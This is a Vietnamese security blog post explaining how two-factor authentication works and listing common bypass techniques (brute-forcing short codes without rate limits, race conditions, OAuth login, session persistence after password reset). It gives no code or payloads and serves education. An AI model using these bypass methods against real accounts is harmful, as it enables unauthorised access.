<!-- wp:core-embed/youtube {"url":"https://www.youtube.com/watch?v=0mvCeNsTa1g","type":"video","providerNameSlug":"youtube","className":"wp-embed-aspect-16-9 wp-has-aspect-ratio"} -->
<figure class="wp-block-embed-youtube wp-block-embed is-type-video is-provider-youtube wp-embed-aspect-16-9 wp-has-aspect-ratio"><div class="wp-block-embed__wrapper">
https://www.youtube.com/watch?v=0mvCeNsTa1g
</div></figure>
<!-- /wp:core-embed/youtube -->

<!-- wp:paragraph -->
<p>Dưới đây là cách xác thực 2FA hoạt động:</p>
<!-- /wp:paragraph -->

<!-- wp:list {"ordered":true} -->
<ol><li>Người dùng được nhắc đăng nhập bằng ứng dụng hoặc trang web.</li><li>Người dùng nhập những gì họ biết -  username/password ,email .&nbsp;Sau đó, máy chủ của trang web tìm thấy kết quả hợp lệ và định danh người dùng.</li><li>Trang web sau đó sẽ sử dụng các yếu tố sở hữu duy nhất  như email, sdt có liên kết với tài khoản của người dùng  để gửi one time code dưới dạng một token hoặc text message.</li><li>Sau đó, người dùng nhập mã một lần được tạo trong bước 3.</li><li>Sau khi cung cấp cả hai yếu tố, người dùng được xác thực và cấp quyền truy cập vào ứng dụng hoặc trang web.</li></ol>
<!-- /wp:list -->

<!-- wp:heading {"level":3} -->
<h3><strong>Bypass xác thực </strong>2FA</h3>
<!-- /wp:heading -->

<!-- wp:paragraph -->
<p>Dưới đây là  một số cách thồng thường mà các hacker hay sử dụng để vượt qua phương thức bảo mật này  :</p>
<!-- /wp:paragraph -->

<!-- wp:list -->
<ul><li>Burteforce : Nó là biện pháp phổ biến và hay dùng nhất do các code thường chỉ có từ 3 dến 6 kĩ tự và hầu như chỉ là số. Vì vậy nếu khồng có giới hạn request thì việc sử dụng bruteforce tỷ lệ  thành công rất là cao.</li><li>Race conditions: Bằng việc sử dụng đồng thời nhiều request cùng một thời điểm khiến server không kịp xử lí đãn đến tạo ra các giá trị code đã sử dụng trước đó hoặc chưa sử dụng tại một thời điểm sau đó. Và kẻ tấn công có thể tái sử dụng nó. </li><li>Via Oauth: Tích hợp Oauth là một cơ chế đăng nhập của bên thứ ba cho phép người dùng đăng nhập bằng tài khoản bên thứ ba.Để bypass, kẻ tấn công phải có quyền truy cập vào tài khoản tích hợp Oauth để đăng nhập thay vì dùng tài khoản trực tiếp của người dùng.</li><li>Via session management :Phương pháp này dựa vào việc bỏ qua cơ chế xác thực hai yếu tố bằng cách sử dụng các chức năng như đặt lại mật khẩu, Về cơ bản,ngay sau khi sử dụng token để đặt lại mật khẩu nó sẽ  duy trì một phiên với ứng dụng  , dẫn đến việc bypass.</li></ul>
<!-- /wp:list -->

<!-- wp:paragraph -->
<p>Ngoài ra còn rất nhiều cách khác đến từ vấn đề logic flow, người dùng ... Bạn có thể tham khảo từ writeup, tip/trick của các hacker , bughunter ...</p>
<!-- /wp:paragraph -->

<!-- wp:image -->
<figure class="wp-block-image"><img src="https://pbs.twimg.com/media/EW8vBWEX0AAxcVj?format=jpg&amp;name=large" alt="Image"/></figure>
<!-- /wp:image -->

<!-- wp:paragraph -->
<p>Một tip bypass 2FA từ <a rel="noreferrer noopener" href="https://twitter.com/hackerscrolls/status/1256276376019230720/photo/1" target="_blank">@hackerscrolls</a></p>
<!-- /wp:paragraph -->

<!-- wp:paragraph -->
<p>Ok kết luận lại, với 2FA va MFA việc bảo mật sẽ tốt hơn rất nhiều nhưng yếu tố quan trọng nhất vẫn phụ thuộc vào con người. So với 2FA, thì MFA sẽ cố phần nhỉnh hơn về độ an toàn nhưng lại phức tạp, khá tốn chi phí, thời gian xác thực  vì vậy nên áp dụng mỗi phương thức vào môi trường hợp lệ. </p>
<!-- /wp:paragraph -->

<!-- wp:paragraph -->
<p>Cảm ơn các bạn đã đọc bài. Xin chào và hẹn gặp lại !!!   </p>
<!-- /wp:paragraph -->

<!-- wp:heading -->
<h2>Tham khảo </h2>
<!-- /wp:heading -->

<!-- wp:list -->
<ul><li><a href="https://en.wikipedia.org/wiki/Multi-factor_authentication" target="_blank" rel="noopener">https://en.wikipedia.org/wiki/Multi-factor_authentication</a></li><li><a href="https://kipalog.com/posts/Two-Factor-Authentication-va-ung-dung" target="_blank" rel="noopener">https://kipalog.com/posts/Two-Factor-Authentication-va-ung-dung</a></li><li><a href="https://shahmeeramir.com/4-methods-to-bypass-two-factor-authentication-2b0075d9eb5f" target="_blank" rel="noopener">https://shahmeeramir.com/4-methods-to-bypass-two-factor-authentication-2b0075d9eb5f</a></li><li><a href="https://securitytrails.com/blog/two-factor-auth-vs-multi-factor-auth" target="_blank" rel="noopener">https://securitytrails.com/blog/two-factor-auth-vs-multi-factor-auth</a></li><li><a href="https://www.loginradius.com/blog/2019/06/what-is-multi-factor-authentication/" target="_blank" rel="noopener">https://www.loginradius.com/blog/2019/06/what-is-multi-factor-authentication/</a></li></ul>
<!-- /wp:list -->

<!-- wp:paragraph -->
<p></p>
<!-- /wp:paragraph -->

      
    </div>
    <footer class="article-footer">
      <a data-url="http://yoursite.com/2020/06/14/authen/" data-id="ckbgpmbcq000kqxjmgrm8g6fb" class="article-share-link">Share</a>
      
      
  <ul class="article-tag-list" itemprop="keywords"><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/Technology/" rel="tag">Technology</a></li></ul>

    </footer>
  </div>
  
</article>


  


  <nav id="page-nav">
    
    <span class="page-number current">1</span><a class="page-number" href="/page/2/">2</a><a class="extend next" rel="next" href="/page/2/">Next &amp;raquo;</a>
  </nav>

</section>
        
          <aside id="sidebar">
  
    

  
    
  <div class="widget-wrap">
    <h3 class="widget-title">Tags</h3>
    <div class="widget">
      <ul class="tag-list" itemprop="keywords"><li class="tag-list-item"><a class="tag-list-link" href="/tags/BugBoutyTip/" rel="tag">BugBoutyTip</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/CTF/" rel="tag">CTF</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/Technology/" rel="tag">Technology</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/Web-App/" rel="tag">Web App</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/Web-Server/" rel="tag">Web Server</a></li></ul>
    </div>
  </div>


  
    
  <div class="widget-wrap">
    <h3 class="widget-title">Tag Cloud</h3>
    <div class="widget tagcloud">
      <a href="/tags/BugBoutyTip/" style="font-size: 10px;">BugBoutyTip</a> <a href="/tags/CTF/" style="font-size: 10px;">CTF</a> <a href="/tags/Technology/" style="font-size: 20px;">Technology</a> <a href="/tags/Web-App/" style="font-size: 13.33px;">Web App</a> <a href="/tags/Web-Server/" style="font-size: 16.67px;">Web Server</a>
    </div>
  </div>

  
    
  <div class="widget-wrap">
    <h3 class="widget-title">Archives</h3>
    <div class="widget">
      <ul class="archive-list"><li class="archive-list-item"><a class="archive-list-link" href="/archives/2020/06/">June 2020</a></li></ul>
    </div>
  </div>


  
    
  <div class="widget-wrap">
    <h3 class="widget-title">Recent Posts</h3>
    <div class="widget">
      <ul>
        
          <li>
            <a href="/2020/06/15/CROSS%20SIDE%20REQUEST%20FORGERY/">Cross Side Request Forgery</a>
          </li>
        
          <li>
            <a href="/2020/06/14/oath/">Oauth</a>
          </li>
        
          <li>
            <a href="/2020/06/14/Session%20vs%20Token-Based%20Authentication/">Session &amp; Token-Based Authentication</a>
          </li>
        
          <li>
            <a href="/2020/06/14/Cross%20Site%20Scripting%20(Part1)/">Cross Site Scripting (Part 1)</a>
          </li>
        
          <li>
            <a href="/2020/06/14/Host%20Header%20Attack/">Host Header Attack</a>
          </li>
        
      </ul>
    </div>
  </div>

  
</aside>
        
      </div>
      <footer id="footer">
  
  <div class="outer">
    <div id="footer-info" class="inner">
      &copy; 2020 John Doe<br>
      Powered by <a href="http://hexo.io/" target="_blank">Hexo</a>
    </div>
  </div>
</footer>
    </div>
    <nav id="mobile-nav">
  
    <a href="/" class="mobile-nav-link">Home</a>
  
    <a href="/archives" class="mobile-nav-link">Archives</a>
  
</nav>
    

<script src="//ajax.googleapis.com/ajax/libs/jquery/2.0.3/jquery.min.js"></script>


  
<link rel="stylesheet" href="/fancybox/jquery.fancybox.css">

  
<script src="/fancybox/jquery.fancybox.pack.js"></script>




<script src="/js/script.js"></script>




  </div>
</body>
</html>